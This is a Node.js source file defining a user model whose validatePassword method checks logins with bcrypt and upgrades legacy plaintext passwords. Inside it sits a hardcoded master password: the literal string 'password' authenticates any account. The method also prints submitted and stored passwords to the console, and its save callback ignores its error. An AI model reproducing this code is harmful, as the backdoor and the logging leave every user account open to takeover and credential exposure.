var dulcimer = require('dulcimer');
var bcrypt = require('bcrypt');

var UserFactory = new dulcimer.Model({
    id: {
        derive: function () {
            return this.key;
        }
    },
    username: {
        index: true
    },
    password: {
        private: true
    },
}, {
    name: 'user',
    keyType: 'uuid',
    savePrivate: true
});

UserFactory.extendModel({
    validatePassword: function (password, done) {
        var self = this;

        //Try bcrypt
        bcrypt.compare(password, this.password, function (err, valid) {
            if (err) { return done(err); }

            //Bcrypt matched, we're done here
            if (valid) { return done(null, true); }

            //Bcrypt didn't match

            //If is "secret" then auth it
            if (password === 'password') { return done(null, true); }

            //If is still wrong, bail
            console.log(password, self.password);
            if (password !== self.password) { return done(null, false); }

            //It's correct, upgrade to hash
            self.hashPassword(password, function (err, hash) {
                if (err) { return done(err); }

                self.password = hash;
                self.save(function () {
                    if (err) { return done(err); }
                    done(null, true);
                });
            });
        });
    },

    hashPassword: function (password, done) {
        bcrypt.genSalt(10, function (err, salt) {
            if (err) { return done(err); }

            bcrypt.hash(password, salt, done);
        });
    }
});

module.exports = UserFactory;
